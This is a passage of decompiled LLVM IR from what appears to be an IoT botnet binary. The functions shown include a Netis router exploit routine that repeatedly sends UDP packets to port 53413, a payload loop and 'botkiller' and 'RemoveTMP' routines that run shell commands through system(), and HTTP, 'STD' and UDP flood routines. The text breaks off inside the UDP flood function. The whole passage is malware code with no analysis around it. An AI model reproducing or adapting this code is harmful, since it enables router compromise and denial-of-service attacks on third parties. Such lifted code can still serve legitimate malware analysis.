  %v3_f75c = add i32 %v2_e270, 9
  %v4_f75c = inttoptr i32 %v3_f75c to i8*
  store i8 3, i8* %v4_f75c, align 1
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f77c = add i32 %v2_e26c, %v2_f5b8
  %v1_f780 = inttoptr i32 %v2_f77c to i32*
  %v2_f780 = load i32, i32* %v1_f780, align 4
  %v1_f784 = add i32 %v2_f780, 60
  store i32 %v1_f784, i32* @r4, align 4
  %v2_f78c = call i32 @__GI_time(i32* null)
  %v0_f794 = load i32, i32* @r4, align 4
  %v3_f794 = icmp ult i32 %v0_f794, %v2_f78c
  br i1 %v3_f794, label %dec_label_pc_f79c, label %dec_label_pc_f7ec

dec_label_pc_f79c:                                ; preds = %dec_label_pc_f738
  %v3_f7c0 = inttoptr i32 %v2_f754 to i8*
  store i8 0, i8* %v3_f7c0, align 4
  store i32 %v2_f754, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v4_f75c, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_f7ec:                                ; preds = %dec_label_pc_eb1c, %dec_label_pc_ecc4, %dec_label_pc_f000, %dec_label_pc_f5a0, %dec_label_pc_f738, %dec_label_pc_e2bc, %dec_label_pc_e570, %dec_label_pc_f6c0, %dec_label_pc_f5dc, %dec_label_pc_f54c, %dec_label_pc_f3d8, %dec_label_pc_f3ac, %dec_label_pc_f31c, %dec_label_pc_f21c, %dec_label_pc_f1c8, %dec_label_pc_f138, %dec_label_pc_f03c, %dec_label_pc_efd4, %dec_label_pc_efa8, %dec_label_pc_eee0, %dec_label_pc_ee8c, %dec_label_pc_edfc, %dec_label_pc_ed00, %dec_label_pc_ec98, %dec_label_pc_ec6c, %dec_label_pc_eb58, %dec_label_pc_eaa4, %dec_label_pc_e988, %dec_label_pc_e910, %dec_label_pc_e738, %dec_label_pc_e6e8, %dec_label_pc_e544, %dec_label_pc_e4ec, %dec_label_pc_f79c
  %v1_f7f0 = add nuw nsw i32 %storemerge612, 1
  %v5_f804 = icmp slt i32 %v1_f7f0, 1000
  br i1 %v5_f804, label %dec_label_pc_e258, label %dec_label_pc_e24c

; uselistorder directives
  uselistorder i32 %v3_f698, { 1, 0 }
  uselistorder i32 %v2_f568, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v3_f110, { 1, 0 }
  uselistorder i32 %v2_f0c8, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_eff0, { 1, 0, 2 }
  uselistorder i32 %v3_edd4, { 1, 0 }
  uselistorder i32 %v2_ed8c, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_ecb4, { 1, 0, 2 }
  uselistorder i32 %v2_e9a0, { 1, 0 }
  uselistorder i32* %v1_e7e0, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %storemerge711, { 1, 0 }
  uselistorder i32 %v0_e3c4, { 1, 0 }
  uselistorder i8* %v2_e32c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_e2a0, { 1, 0 }
  uselistorder i32* %v1_e278, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_e270, { 4, 5, 49, 50, 51, 38, 39, 40, 46, 41, 42, 45, 44, 43, 3, 47, 48, 34, 33, 36, 35, 37, 29, 30, 31, 32, 25, 24, 27, 26, 28, 20, 21, 22, 23, 17, 18, 15, 16, 11, 12, 13, 14, 19, 7, 1, 2, 8, 0, 10, 9, 6 }
  uselistorder i32 %v2_e26c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_e264, { 66, 64, 65, 63, 49, 62, 61, 59, 60, 58, 57, 55, 56, 54, 52, 53, 50, 51, 48, 47, 46, 45, 44, 43, 40, 41, 42, 39, 38, 37, 36, 35, 34, 31, 32, 33, 30, 29, 27, 28, 26, 24, 25, 23, 22, 20, 21, 19, 18, 17, 16, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i32 %storemerge612, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_f5b8, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v2_e78c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_e234, { 1, 0, 2 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %v3_e174, { 3, 7, 6, 5, 4, 8, 9, 12, 11, 10, 13, 0, 14, 1, 17, 18, 19, 16, 2, 15 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-344, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 117, 116 }
  uselistorder i32 (i32, i32, i32)* @get_telstate_host, { 1, 0 }
  uselistorder i32 35, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8*]* @global_var_2c1f4.507 to i32), { 2, 3, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_209d0.505 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([7 x i8*]* @global_var_2c1e8.503 to i32), { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f7ec, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e7a0, { 1, 0 }
  uselistorder label %dec_label_pc_e738, { 1, 0 }
  uselistorder label %dec_label_pc_e2bc, { 1, 0 }
  uselistorder label %dec_label_pc_e258, { 1, 0 }
  uselistorder label %dec_label_pc_e1b8, { 1, 0 }
}

define i32 @StartTheNetis(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 63548, i32* %stack_var_-4, align 4
  %v2_f838 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f838, i32* @fp, align 4
  %v2_f89c = bitcast i32* %stack_var_-44 to i8*
  %v2_f8b0 = ptrtoint i32* %stack_var_-1076 to i32
  %tmp17 = bitcast i32* %stack_var_-1076 to i8*
  %v2_f8dc = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_f840

dec_label_pc_f840:                                ; preds = %dec_label_pc_f840, %entry
  %v3_f84c = call i32 @socket(i32 2, i32 2, i32 0)
  %v0_f858 = call i32 @NetisRanges()
  store i32 2, i32* %stack_var_-52, align 4
  %v1_f874 = call i32 @__GI_htons(i32 53413)
  store i32 8, i32* @r2, align 4
  %v3_f89c = call i32 @__GI_memset(i8* %v2_f89c, i32 0)
  store i32 %v2_f8b0, i32* @r0, align 4
  %v3_f8c0 = call i32 @sprintf(i32 %v2_f8b0, i32 ptrtoint ([327 x i8]* @global_var_20a50.518 to i32))
  %v3_f8d4 = call i32 @strlen(i8* %tmp17)
  %v6_f908 = call i32 @__libc_sendto(i32 %v3_f84c, i32 %v2_f8b0, i32 %v3_f8d4, i32 0, i32 %v2_f8dc, i32 16)
  br label %dec_label_pc_f840

; uselistorder directives
  uselistorder i32 %v2_f8b0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @LoopPayload(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f940 = call i32 @__libc_system(i32 ptrtoint ([320 x i8]* @global_var_20ba0.522 to i32))
  ret i32 %v2_f940
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-520 = alloca i32, align 4
  %stack_var_-184 = alloca i8**, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-44 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_f964 = load i32, i32* @r4, align 4
  %v6_f964 = load i32, i32* @fp, align 4
  %v13_f964 = load i32, i32* @lr, align 4
  store i32 63852, i32* %stack_var_-4, align 4
  %v2_f968 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f968, i32* @fp, align 4
  %v21_f988 = ptrtoint i8** %stack_var_-44 to i32
  store i32 %v21_f988, i32* @lr, align 4
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20eb8.532, i32 0, i32 0), i8** %stack_var_-44, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_20e0c.566 to i32), i32* @r3, align 4
  %v2_f998 = ptrtoint i32* %stack_var_-168 to i32
  store i32 92, i32* @ip, align 4
  store i32 %v2_f998, i32* @r0, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_20e0c.566 to i32), i32* @r1, align 4
  store i32 92, i32* @r2, align 4
  %v0_f9ac = call i32 @memcpy()
  %v21_f9d0 = ptrtoint i8*** %stack_var_-184 to i32
  store i32 %v21_f9d0, i32* @lr, align 4
  store i8** bitcast ([5 x i8]* @global_var_20d44.546 to i8**), i8*** %stack_var_-184, align 4
  %v6_f9f0 = icmp sgt i32 %tmp29, 0
  br i1 %v6_f9f0, label %dec_label_pc_f9f4, label %dec_label_pc_fb88

dec_label_pc_f9f4:                                ; preds = %entry
  %v2_f9f4 = ptrtoint i32* %stack_var_-520 to i32
  store i32 128, i32* @r2, align 4
  %v2_fa04 = bitcast i32* %stack_var_-520 to i8*
  %v3_fa04 = call i32 @__GI_memset(i8* %v2_fa04, i32 0)
  %v2_fa20 = ptrtoint i32* %stack_var_-24 to i32
  %v2_fa28 = add i32 %v2_fa20, -52
  %v1_fa2c = inttoptr i32 %v2_fa28 to i32*
  %v2_fa2c = load i32, i32* %v1_fa2c, align 4
  store i32 %v2_fa2c, i32* @lr, align 4
  store i32 %v2_fa20, i32* @r4, align 4
  store i32 %v2_f9f4, i32* @r0, align 4
  store i32 127, i32* @r1, align 4
  %v7_fac4 = call i32 @__GI_snprintf(i32 %v2_f9f4, i32 127, i32 ptrtoint ([100 x i8]* @global_var_20ee8.594 to i32), i32 %v2_fa2c, i32 %v2_fa2c, i32 %v2_fa2c)
  %v1_fb48 = call i32 @__libc_system(i32 %v2_f9f4)
  %v2_fb68 = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_fb68, i32* @r0, align 4
  %v3_fb74 = call i32 @sprintf(i32 %v2_fb68, i32 ptrtoint ([14 x i8]* @global_var_20f6c.598 to i32))
  %v1_fb80 = call i32 @__libc_system(i32 %v2_fb68)
  br label %dec_label_pc_fb90

dec_label_pc_fb88:                                ; preds = %entry
  %v1_fb8c = call i32 @sleep(i32 5)
  br label %dec_label_pc_fb90

dec_label_pc_fb90:                                ; preds = %dec_label_pc_f9f4, %dec_label_pc_fb88
  %storemerge26 = phi i32 [ %v1_fb8c, %dec_label_pc_fb88 ], [ %v1_fb80, %dec_label_pc_f9f4 ]
  store i32 %v3_f964, i32* @r4, align 4
  store i32 %v6_f964, i32* @fp, align 4
  store i32 %v13_f964, i32* @lr, align 4
  ret i32 %storemerge26

; uselistorder directives
  uselistorder i32 %v2_fb68, { 0, 2, 1 }
  uselistorder i32 %v2_fa2c, { 1, 2, 3, 0 }
  uselistorder i32 %v2_fa20, { 1, 0 }
  uselistorder i32 %v2_f9f4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-44, { 1, 0 }
  uselistorder i8*** %stack_var_-184, { 1, 0 }
  uselistorder label %dec_label_pc_fb90, { 1, 0 }
}

define i32 @RemoveTMP(i32 %arg1) local_unnamed_addr {
entry:
  %v2_fbc4 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_20f7c.601 to i32))
  %v2_fbcc = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_20fa8.603 to i32))
  %v2_fbd4 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_20fc0.605 to i32))
  %v2_fbdc = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_20fa8.603 to i32))
  %v2_fbe4 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_20fd8.607 to i32))
  %v2_fbec = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_20fe8.609 to i32))
  %v2_fbf4 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_20ff4.611 to i32))
  %v2_fbfc = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_2100c.613 to i32))
  %v2_fc04 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_21020.615 to i32))
  %v2_fc0c = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_2102c.617 to i32))
  %v2_fc14 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_21040.619 to i32))
  %v2_fc1c = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_21050.621 to i32))
  %v2_fc24 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_21068.623 to i32))
  ret i32 %v2_fc24

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_fc68 = load i32, i32* @fp, align 4
  store i32 64624, i32* %stack_var_-4, align 4
  %v2_fc6c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fc6c, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_fc8c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_fc9c = icmp eq i32 %v1_fc8c, 0
  br i1 %v2_fc9c, label %dec_label_pc_fca4, label %dec_label_pc_fcb0

dec_label_pc_fca4:                                ; preds = %entry
  br label %dec_label_pc_fd7c

dec_label_pc_fcb0:                                ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_fcb4 = add i32 %v1_fc8c, 16
  %v2_fcb4 = inttoptr i32 %v1_fcb4 to i32*
  %v3_fcb4 = load i32, i32* %v2_fcb4, align 4
  %v1_fcb8 = inttoptr i32 %v3_fcb4 to i32*
  %v2_fcb8 = load i32, i32* %v1_fcb8, align 4
  %v1_fcc0 = add i32 %v1_fc8c, 12
  %v2_fcc0 = inttoptr i32 %v1_fcc0 to i32*
  %v3_fcc0 = load i32, i32* %v2_fcc0, align 4
  store i32 %v3_fcc0, i32* @r2, align 4
  %v2_fccc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fccc, i32* @r3, align 4
  %v5_fcd8 = call i32 @bcopy(i32 %v2_fcb8, i32 %v2_fccc, i32 %v3_fcc0, i32 %v2_fccc, i32 %v1_fc8c)
  %v2_fce4 = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_fd04 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_fd10 = ptrtoint i32* %stack_var_-44 to i32
  %v5_fd2c = call i32 @__GI_setsockopt(i32 %v3_fd04, i32 6, i32 1, i32 %v2_fd10, i32 4)
  %v3_fd34 = icmp eq i32 %v3_fd04, -1
  br i1 %v3_fd34, label %dec_label_pc_fd3c, label %dec_label_pc_fd48

dec_label_pc_fd3c:                                ; preds = %dec_label_pc_fcb0
  br label %dec_label_pc_fd7c

dec_label_pc_fd48:                                ; preds = %dec_label_pc_fcb0
  %v2_fcc8 = ptrtoint i32* %stack_var_-40 to i32
  %v3_fd58 = call i32 @__libc_connect(i32 %v3_fd04, i32 %v2_fcc8, i32 16)
  %v3_fd60 = icmp eq i32 %v3_fd58, -1
  br i1 %v3_fd60, label %dec_label_pc_fd68, label %dec_label_pc_fd74

dec_label_pc_fd68:                                ; preds = %dec_label_pc_fd48
  br label %dec_label_pc_fd7c

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fd48
  br label %dec_label_pc_fd7c

dec_label_pc_fd7c:                                ; preds = %dec_label_pc_fd68, %dec_label_pc_fd3c, %dec_label_pc_fca4, %dec_label_pc_fd74
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_fca4 ], [ 0, %dec_label_pc_fd3c ], [ 0, %dec_label_pc_fd68 ], [ %v3_fd04, %dec_label_pc_fd74 ]
  store i32 %v3_fc68, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_fd7c, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-808 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 64924, i32* %stack_var_-4, align 4
  %v2_fd98 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fd98, i32* @fp, align 4
  %v2_fdb4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 ptrtoint ([62 x i8*]* @global_var_22414.687 to i32), i32* @r3, align 4
  %v2_fdc0 = ptrtoint i32* %stack_var_-284 to i32
  store i32 248, i32* @ip, align 4
  store i32 %v2_fdc0, i32* @r0, align 4
  store i32 ptrtoint ([62 x i8*]* @global_var_22414.687 to i32), i32* @r1, align 4
  store i32 248, i32* @r2, align 4
  %v0_fdd4 = call i32 @memcpy()
  %v2_fdec = call i32 @__GI_time(i32* null)
  %v3_fdf4 = load i32, i32* %stack_var_0, align 4
  %v2_fdf8 = add i32 %v3_fdf4, %v2_fdec
  %v0_fe00 = call i32 @rand()
  %v2_fe14 = srem i32 %v0_fe00, 3
  %v3_fe40 = mul nsw i32 %v2_fe14, 4
  %v2_fe48 = add i32 %v3_fe40, %v2_fdb4
  %v2_fe4c = add i32 %v2_fe48, -272
  %v1_fe50 = inttoptr i32 %v2_fe4c to i32*
  %v2_fe50 = load i32, i32* %v1_fe50, align 4
  store i32 %v2_fe50, i32* @r4, align 4
  %v0_fe54 = call i32 @rand()
  %v2_feb4 = ptrtoint i32* %stack_var_-808 to i32
  store i32 %v2_feb4, i32* @r0, align 4
  %v3_fed0 = call i32 @sprintf(i32 %v2_feb4, i32 ptrtoint ([62 x i8]* @global_var_2250c.697 to i32))
  store i32 %v3_fed0, i32* @r0, align 4
  %tmp30 = bitcast i32* %stack_var_-808 to i8*
  %v5_ff8837 = icmp sgt i32 %arg6, 0
  br i1 %v5_ff8837, label %dec_label_pc_fee0, label %dec_label_pc_ff8c

dec_label_pc_fee0:                                ; preds = %entry, %dec_label_pc_ff70
  %storemerge138 = phi i32 [ %v1_ff74, %dec_label_pc_ff70 ], [ 0, %entry ]
  %v0_fee0 = call i32 @__libc_fork()
  store i32 %v0_fee0, i32* @r0, align 4
  %v2_fee8 = icmp eq i32 %v0_fee0, 0
  br i1 %v2_fee8, label %dec_label_pc_ff70, label %dec_label_pc_ff50

dec_label_pc_fef4:                                ; preds = %dec_label_pc_ff50
  %v4_ff10 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v2_ff20 = icmp eq i32 %v4_ff10, 0
  br i1 %v2_ff20, label %dec_label_pc_ff50, label %dec_label_pc_ff28

dec_label_pc_ff28:                                ; preds = %dec_label_pc_fef4
  %v3_ff30 = call i32 @strlen(i8* %tmp30)
  %v2_ff44 = call i32 @__GI_write(i32 %v4_ff10, i32 %v2_feb4)
  %v1_ff4c = call i32 @__GI_close(i32 %v4_ff10)
  br label %dec_label_pc_ff50

dec_label_pc_ff50:                                ; preds = %dec_label_pc_fef4, %dec_label_pc_ff28, %dec_label_pc_fee0
  %v2_ff54 = call i32 @__GI_time(i32* null)
  %v5_ff64 = icmp slt i32 %v2_ff54, %v2_fdf8
  br i1 %v5_ff64, label %dec_label_pc_fef4, label %dec_label_pc_ff68

dec_label_pc_ff68:                                ; preds = %dec_label_pc_ff50
  %v1_ff6c = call i32 @__GI__exit(i32 1)
  store i32 %v1_ff6c, i32* @r0, align 4
  br label %dec_label_pc_ff70

dec_label_pc_ff70:                                ; preds = %dec_label_pc_fee0, %dec_label_pc_ff68
  %v1_ff943 = phi i32 [ 0, %dec_label_pc_fee0 ], [ %v1_ff6c, %dec_label_pc_ff68 ]
  %v1_ff74 = add nuw nsw i32 %storemerge138, 1
  %v5_ff88 = icmp slt i32 %v1_ff74, %arg6
  br i1 %v5_ff88, label %dec_label_pc_fee0, label %dec_label_pc_ff8c

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff70, %entry
  %v1_ff94.lcssa = phi i32 [ %v3_fed0, %entry ], [ %v1_ff943, %dec_label_pc_ff70 ]
  ret i32 %v1_ff94.lcssa

; uselistorder directives
  uselistorder i32 %v1_ff74, { 1, 0 }
  uselistorder i32 %v4_ff10, { 1, 0, 2 }
  uselistorder i32 %v2_feb4, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_ff70, { 1, 0 }
  uselistorder label %dec_label_pc_ff50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fee0, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_ffac = load i32, i32* @fp, align 4
  store i32 %v3_ffac, i32* %stack_var_-16, align 4
  store i32 65460, i32* %stack_var_-4, align 4
  %v13_ffac = ptrtoint i32* %stack_var_-16 to i32
  %v2_ffb0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ffb0, i32* @fp, align 4
  %v3_ffd0 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_ffe0 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_fff4 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10000 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10000, i32* @r0, align 4
  %v2_1000c = call i32 @bzero(i32 %v2_10000, i32 16)
  %v1_10014 = add i32 %v1_fff4, 16
  %v2_10014 = inttoptr i32 %v1_10014 to i32*
  %v3_10014 = load i32, i32* %v2_10014, align 4
  %v1_10018 = inttoptr i32 %v3_10014 to i32*
  %v2_10018 = load i32, i32* %v1_10018, align 4
  %v1_10020 = add i32 %v1_fff4, 12
  %v2_10020 = inttoptr i32 %v1_10020 to i32*
  %v3_10020 = load i32, i32* %v2_10020, align 4
  store i32 %v3_10020, i32* @r2, align 4
  %v2_1002c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1002c, i32* @r3, align 4
  %v5_10038 = call i32 @bcopy(i32 %v2_10018, i32 %v2_1002c, i32 %v3_10020, i32 %v2_1002c, i32 ptrtoint (i32* @0 to i32))
  %v1_10040 = add i32 %v1_fff4, 8
  %v2_10040 = inttoptr i32 %v1_10040 to i32*
  %v3_10040 = load i32, i32* %v2_10040, align 4
  %v3_10048 = urem i32 %v3_10040, 65536
  store i32 %v3_10048, i32* %stack_var_-52, align 4
  %v2_1006c = ptrtoint i32* %stack_var_-196 to i32
  %v2_10120 = add i32 %v2_ffe0, %arg3
  %v2_100c8 = add i32 %v13_ffac, -180
  br label %dec_label_pc_10068

dec_label_pc_10068:                               ; preds = %dec_label_pc_10144, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_10148, %dec_label_pc_10144 ]
  store i32 ptrtoint ([36 x i8*]* @global_var_22708.735 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_1006c, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_22708.735 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_10080 = call i32 @memcpy()
  %v0_10084 = call i32 @rand()
  %v1_10094 = zext i32 %v0_10084 to i64
  %v4_10094 = mul nuw nsw i64 %v1_10094, 954437177
  %v3_100981 = udiv i64 %v4_10094, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_10144, label %dec_label_pc_100e4

dec_label_pc_100e4:                               ; preds = %dec_label_pc_10068
  %v3_100a43 = mul nuw nsw i64 %v3_100981, 4
  %v3_100a4 = trunc i64 %v3_100a43 to i32
  %v2_100ac.neg = sub i32 %v0_10084, %v3_100a4
  %v3_100a85 = mul nuw nsw i64 %v3_100981, 32
  %v3_100a8 = trunc i64 %v3_100a85 to i32
  %v2_100b0 = sub i32 %v2_100ac.neg, %v3_100a8
  %v3_100c0 = mul i32 %v2_100b0, 4
  %v2_100cc = add i32 %v2_100c8, %v3_100c0
  %v1_100d0 = inttoptr i32 %v2_100cc to i32*
  %v2_100d0 = load i32, i32* %v1_100d0, align 4
  %v5_100f4 = call i32 @__libc_send(i32 %v3_ffd0, i32 %v2_100d0, i32 75, i32 0)
  %v3_10108 = call i32 @__libc_connect(i32 %v3_ffd0, i32 %v2_10000, i32 16)
  %v2_10110 = call i32 @__GI_time(i32* null)
  %v5_10128 = icmp slt i32 %v2_10110, %v2_10120
  br i1 %v5_10128, label %dec_label_pc_1013c, label %dec_label_pc_1012c

dec_label_pc_1012c:                               ; preds = %dec_label_pc_100e4
  %v1_10130 = call i32 @__GI_close(i32 %v3_ffd0)
  %v1_10138 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1013c

dec_label_pc_1013c:                               ; preds = %dec_label_pc_100e4, %dec_label_pc_1012c
  br label %dec_label_pc_10144

dec_label_pc_10144:                               ; preds = %dec_label_pc_10068, %dec_label_pc_1013c
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_10068 ], [ 0, %dec_label_pc_1013c ]
  %v1_10148 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_10068

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_10000, { 0, 2, 1 }
  uselistorder i32 %v1_fff4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10144, { 1, 0 }
  uselistorder label %dec_label_pc_1013c, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 65896, i32* %stack_var_-4, align 4
  %v2_10164 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10164, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_10188 = icmp eq i32 %arg2, 0
  br i1 %v2_10188, label %dec_label_pc_10190, label %dec_label_pc_101a8

dec_label_pc_10190:                               ; preds = %entry
  %v0_10190 = call i32 @rand_cmwc()
  br label %dec_label_pc_101c4

dec_label_pc_101a8:                               ; preds = %entry
  %v3_101b0 = urem i32 %arg2, 65536
  %v1_101b8 = call i32 @__GI_htons(i32 %v3_101b0)
  br label %dec_label_pc_101c4

dec_label_pc_101c4:                               ; preds = %dec_label_pc_10190, %dec_label_pc_101a8
  %v3_101d4 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_101dc = icmp eq i32 %v3_101d4, 0
  br i1 %v2_101dc, label %dec_label_pc_101e4, label %dec_label_pc_10724

dec_label_pc_101e4:                               ; preds = %dec_label_pc_101c4
  store i32 8, i32* @r2, align 4
  %v2_101f8 = bitcast i32* %stack_var_-72 to i8*
  %v3_101f8 = call i32 @__GI_memset(i8* %v2_101f8, i32 0)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_10208 = icmp eq i32 %arg4, 32
  br i1 %v7_10208, label %dec_label_pc_10210, label %dec_label_pc_10340

